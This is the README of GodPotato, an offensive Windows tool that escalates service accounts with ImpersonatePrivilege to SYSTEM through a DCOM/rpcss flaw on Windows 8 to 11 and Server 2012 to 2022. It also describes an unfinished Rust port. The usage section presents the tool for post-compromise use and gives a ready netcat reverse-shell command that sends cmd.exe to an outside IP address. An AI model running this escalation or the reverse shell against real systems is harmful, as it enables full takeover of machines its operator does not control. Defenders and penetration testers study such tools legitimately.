# GodPotato


Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions.



Potato privilege escalation is usually used when we obtain WEB/database privileges. We can elevate a service user with low privileges to "NT AUTHORITY\SYSTEM" privileges.
However, the historical Potato has no way to run on the latest Windows system. When I was researching DCOM, I found a new method that can perform privilege escalation. There are some defects in rpcss when dealing with oxid, and rpcss is a service that must be opened by the system. , so it can run on almost any Windows OS, I named it GodPotato



# Affected version

Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11


# Example

```

    FFFFF                   FFF  FFFFFFF
   FFFFFFF                  FFF  FFFFFFFF
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF


Arguments:

        -cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami"


```


Use the program's built-in Clsid for privilege escalation and execute a simple command


```
GodPotato -cmd "cmd /c whoami"
```

![](images/1.png)


Customize Clsid and execute commands

```
GodPotato -cmd "cmd /c whoami"

```


![](images/2.png)


Execute reverse shell commands

```
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

# Rust Port

This repository now includes a Rust port of GodPotato. The port aims to provide:
- **Memory safety:** Leveraging Rust's ownership system to prevent common vulnerabilities
- **Modern error handling:** Using `Result<T, E>` instead of exceptions
- **Cross-platform development:** Compile-time checks on Linux, runtime on Windows
- **Better testing:** Comprehensive unit tests with 100% pass rate

**Status:** Partial implementation (18% complete)
**See:** [RUST_PORT_STATUS.md](RUST_PORT_STATUS.md) for detailed progress report

**Completed Components:**
- ✅ OBJREF binary parsing (DCOM protocol)
- ✅ CLI argument handling (using clap)
- ✅ COM IStream interface implementation
- ✅ COM unmarshaling wrapper
- ✅ Sunday pattern matching algorithm

**Not Yet Implemented:**
- ⚠️ Windows token manipulation
- ⚠️ RPC function hooking
- ⚠️ Named pipe server
- ⚠️ Process creation with elevated privileges
- ⚠️ Full exploit integration

The Rust port provides a solid foundation with ~1,200 LOC of safe, well-tested code, but requires additional work to achieve feature parity with the C# version.

### Building the Rust Port

```bash
# Install Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Build
cd GodPotato
cargo build --release

# Run tests
cargo test

# Run (currently a stub)
cargo run -- --help
```

**Target:** Windows x86_64-pc-windows-msvc (Linux compilation supported for development)

# Thanks

zcgonvh


skay


# License

[Apache License 2.0](/LICENSE) 
